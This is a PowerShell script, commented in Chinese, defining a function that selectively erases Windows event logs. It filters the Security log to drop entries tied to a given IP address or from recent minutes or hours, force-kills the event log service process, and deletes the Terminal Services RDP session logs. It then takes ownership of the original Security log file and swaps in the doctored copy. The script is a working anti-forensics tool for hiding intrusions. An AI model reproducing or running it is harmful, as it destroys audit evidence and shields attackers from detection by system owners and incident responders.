function CleanLog {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [String]$EventLogName,
        [String]$IpAddress,
        [Int]$Mins,
        [Int]$Hours
    )

    # 检查管理员权限
    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Write-Host "请使用管理员权限运行此脚本！" -ForegroundColor Red
        return
    }

    $LogNames = if ($EventLogName.Contains(',')) {
        $EventLogName.Split(',').Trim()
    } else {
        @($EventLogName)
    }

    if ($LogNames.Count -eq 1 -and $LogNames[0] -eq "Security") {
        $LogNames = @(
            "Security",
            "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
            "Microsoft-Windows-TerminalServices-RemoteConnectionManager/Admin",
            "Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational"
        )
    }

    $EventLogPath = "C:\Windows\System32\Winevt\Logs\"
    Write-Host "开始清理以下日志: $($LogNames -join ', ')" -ForegroundColor Cyan

    $TempFiles = @{}
    
    # 第一阶段：为Security日志创建临时文件
    foreach ($CurrentLogName in $LogNames) {
        try {
            if ($CurrentLogName -like "*TerminalServices*") {
                Write-Host "跳过TerminalServices日志: $CurrentLogName (将在服务停止后直接删除)" -ForegroundColor Yellow
                continue
            }
            
            Write-Host "处理非TerminalServices日志: $CurrentLogName"
            
            $Query = ""
            if ($IpAddress) {
                $Query = "*[EventData[(Data[@Name='IpAddress']!='$IpAddress')]]"
            }
            if ($Mins) {
                $TimeCondition = "*[System[TimeCreated[timediff(@SystemTime) > $($Mins * 60000)]]]"
                $Query = if ($Query) { "($Query) and $TimeCondition" } else { $TimeCondition }
            }
            if ($Hours) {
                $TimeCondition = "*[System[TimeCreated[timediff(@SystemTime) > $($Hours * 3600000)]]]"
                $Query = if ($Query) { "($Query) and $TimeCondition" } else { $TimeCondition }
            }
            if ([String]::IsNullOrEmpty($Query)) { 
                Write-Host "警告：没有指定任何过滤条件，将保留所有记录" -ForegroundColor Yellow
                $Query = "*" 
            }

            Write-Host "时间条件说明：将保留符合条件的记录（删除不符合条件的）" -ForegroundColor Magenta
            Write-Host "查询条件: $Query" -ForegroundColor Magenta
            
            $SafeLogName = $CurrentLogName.Replace("/", "%4")
            $TempFile = Join-Path $EventLogPath "${SafeLogName}_.evtx"
            $OriginalFile = Join-Path $EventLogPath "${SafeLogName}.evtx"

            $Result = wevtutil epl "$CurrentLogName" "$TempFile" /q:"$Query" /ow:true 2>&1

            if ($LASTEXITCODE -eq 0) {
                $tempSize = if (Test-Path $TempFile) { (Get-Item $TempFile).Length } else { 0 }
                Write-Host "导出成功: $TempFile ($([Math]::Round($tempSize/1MB, 2)) MB)" -ForegroundColor Green
                $TempFiles[$CurrentLogName] = @{
                    TempFile     = $TempFile
                    OriginalFile = $OriginalFile
                    SafeLogName  = $SafeLogName
                }
            } else {
                Write-Host "导出失败: $Result" -ForegroundColor Red
            }
        } catch {
            Write-Host "处理日志 $CurrentLogName 时出错: $_" -ForegroundColor Red
        }
    }

    # ========== 第二阶段：直接强制终止事件日志服务（不尝试任何温和停止） ==========
    Write-Host "`n正在强制终止事件日志服务进程..." -ForegroundColor Red

    # 方法1：通过服务获取PID
    $svcInfo = Get-WmiObject -Class Win32_Service -Filter "Name='eventlog'" -ErrorAction SilentlyContinue
    if ($svcInfo -and $svcInfo.ProcessId -gt 0) {
        Write-Host "找到 eventlog 服务进程 PID: $($svcInfo.ProcessId)" -ForegroundColor Yellow
        Write-Host "强制终止该进程..."
        taskkill /F /PID $svcInfo.ProcessId 2>&1 | Out-Null
        Start-Sleep -Seconds 2
    }

    # 方法2：如果上面没找到，尝试按服务名终止所有承载 eventlog 的 svchost
    if ((Get-Service eventlog -ErrorAction SilentlyContinue).Status -ne 'Stopped') {
        Write-Host "未找到PID，尝试通过服务名终止进程..."
        taskkill /F /IM svchost.exe /FI "SERVICES eq eventlog" 2>&1 | Out-Null
        Start-Sleep -Seconds 2
    }

    # 方法3：如果还不行，直接杀所有包含 eventlog 字样的进程（备胎）
    if ((Get-Service eventlog -ErrorAction SilentlyContinue).Status -ne 'Stopped') {
        Write-Host "使用通配方式终止所有 eventlog 相关进程..."
        Get-Process -Name svchost -ErrorAction SilentlyContinue | Where-Object {
            (Get-WmiObject Win32_Process -Filter "ProcessId=$($_.Id)" -ErrorAction SilentlyContinue).CommandLine -match 'eventlog'
        } | ForEach-Object {
            Write-Host "终止进程 PID: $($_.Id)"
            taskkill /F /PID $_.Id 2>&1 | Out-Null
        }
        Start-Sleep -Seconds 2
    }

    # 等待并检查服务是否已停止
    $timeout = 10
    while ((Get-Service eventlog -ErrorAction SilentlyContinue).Status -ne 'Stopped' -and $timeout -gt 0) {
        Start-Sleep -Seconds 1
        $timeout--
    }

    if ((Get-Service eventlog).Status -eq 'Stopped') {
        Write-Host "事件日志服务已停止" -ForegroundColor Green
    } else {
        Write-Host "警告：事件日志服务未能停止，仍将继续尝试操作（可能失败）" -ForegroundColor Red
    }

    Write-Host "等待文件锁释放..."
    Start-Sleep -Seconds 3

    # ========== 第三阶段：处理文件（删除 TerminalServices 并替换 Security） ==========
    Write-Host "`n正在删除TerminalServices日志文件..." -ForegroundColor Cyan
    $TSFilesToDelete = @(
        "Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx",
        "Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Admin.evtx",
        "Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx"
    )
    
    foreach ($TSFile in $TSFilesToDelete) {
        $FullPath = Join-Path $EventLogPath $TSFile
        try {
            if (Test-Path $FullPath) {
                Write-Host "正在删除: $TSFile"
                Remove-Item $FullPath -Force -ErrorAction SilentlyContinue
                if (Test-Path $FullPath) {
                    $null = cmd.exe /c "del /F `"$FullPath`"" 2>&1
                }
                if (-not (Test-Path $FullPath)) {
                    Write-Host "删除成功" -ForegroundColor Green
                } else {
                    Write-Host "删除失败，文件可能仍被锁定" -ForegroundColor Red
                }
            } else {
                Write-Host "文件不存在: $TSFile" -ForegroundColor Yellow
            }
        } catch {
            Write-Host "删除文件 $TSFile 时出错: $_" -ForegroundColor Red
        }
    }

    # 替换 Security 日志
    if ($TempFiles.Count -gt 0) {
        Write-Host "`n正在替换Security日志..." -ForegroundColor Cyan
        foreach ($LogEntry in $TempFiles.GetEnumerator()) {
            $CurrentLogName = $LogEntry.Key
            $TempFile = $LogEntry.Value.TempFile
            $OriginalFile = $LogEntry.Value.OriginalFile

            try {
                Write-Host "处理日志: $CurrentLogName"
                if (-not (Test-Path $TempFile)) {
                    Write-Host "警告: 临时文件不存在: $TempFile" -ForegroundColor Yellow
                    continue
                }
                
                $tempSize = if (Test-Path $TempFile) { (Get-Item $TempFile).Length } else { 0 }
                $originalSize = if (Test-Path $OriginalFile) { (Get-Item $OriginalFile).Length } else { 0 }
                Write-Host "临时文件: $([Math]::Round($tempSize/1MB, 2)) MB"
                Write-Host "原始文件: $([Math]::Round($originalSize/1MB, 2)) MB"
                
                if (Test-Path $OriginalFile) {
                    Write-Host "删除原始文件..."
                    Remove-Item $OriginalFile -Force -ErrorAction SilentlyContinue
                    if (Test-Path $OriginalFile) {
                        $null = cmd.exe /c "del /F `"$OriginalFile`"" 2>&1
                    }
                    if (Test-Path $OriginalFile) {
                        Write-Host "获取文件所有权..." -ForegroundColor Yellow
                        $null = takeown.exe /F `"$OriginalFile`" 2>&1
                        $null = icacls.exe `"$OriginalFile`" /grant Administrators:F 2>&1
                        Remove-Item $OriginalFile -Force -ErrorAction SilentlyContinue
                    }
                    Start-Sleep -Milliseconds 500
                }
                
                if (-not (Test-Path $OriginalFile)) {
                    Write-Host "重命名临时文件..."
                    Rename-Item $TempFile $OriginalFile -Force
                    if (Test-Path $OriginalFile) {
                        $finalSize = (Get-Item $OriginalFile).Length
                        Write-Host "日志 $CurrentLogName 替换完成，大小: $([Math]::Round($finalSize/1MB, 2)) MB" -ForegroundColor Green
                    } else {
                        Write-Host "错误: 重命名失败" -ForegroundColor Red
                    }
                } else {
                    Write-Host "错误: 无法删除原始文件" -ForegroundColor Red
                }
            } catch {
                Write-Host "替换日志 $CurrentLogName 时出错: $_" -ForegroundColor Red
            }
        }
    }

    # 重新启动服务
    Write-Host "`n启动事件日志服务..." -ForegroundColor Cyan
    try {
        Start-Service -Name eventlog -ErrorAction Stop
        Write-Host "事件日志服务已启动" -ForegroundColor Green
    } catch {
        Write-Host "无法启动事件日志服务，尝试使用sc命令..." -ForegroundColor Yellow
        $null = sc.exe start eventlog 2>&1
        Start-Sleep -Seconds 2
        $serviceStatus = Get-Service -Name eventlog -ErrorAction SilentlyContinue
        if ($serviceStatus.Status -eq "Running") {
            Write-Host "事件日志服务已成功启动" -ForegroundColor Green
        } else {
            Write-Host "警告：事件日志服务可能未启动，可能需要重启系统" -ForegroundColor Red
        }
    }

    Write-Host "`n所有日志处理完成!" -ForegroundColor Green
    
    Write-Host "`n清理摘要:" -ForegroundColor Cyan
    foreach ($LogEntry in $TempFiles.GetEnumerator()) {
        $OriginalFile = $LogEntry.Value.OriginalFile
        if (Test-Path $OriginalFile) {
            $size = (Get-Item $OriginalFile).Length / 1MB
            Write-Host "  $($LogEntry.Key): $([Math]::Round($size, 2)) MB" -ForegroundColor Gray
        }
    }
    
    Write-Host "`n清理说明:" -ForegroundColor Magenta
    if ($Hours -gt 0) {
        Write-Host "  已删除最近 $Hours 小时内的记录" -ForegroundColor Magenta
        Write-Host "  保留了 $Hours 小时前的记录" -ForegroundColor Magenta
    } elseif ($Mins -gt 0) {
        Write-Host "  已删除最近 $Mins 分钟内的记录" -ForegroundColor Magenta
        Write-Host "  保留了 $Mins 分钟前的记录" -ForegroundColor Magenta
    }
}

# 使用示例：
# CleanLog -EventLogName Security -Hours 2
# CleanLog -EventLogName Security -Mins 30
# CleanLog -EventLogName Security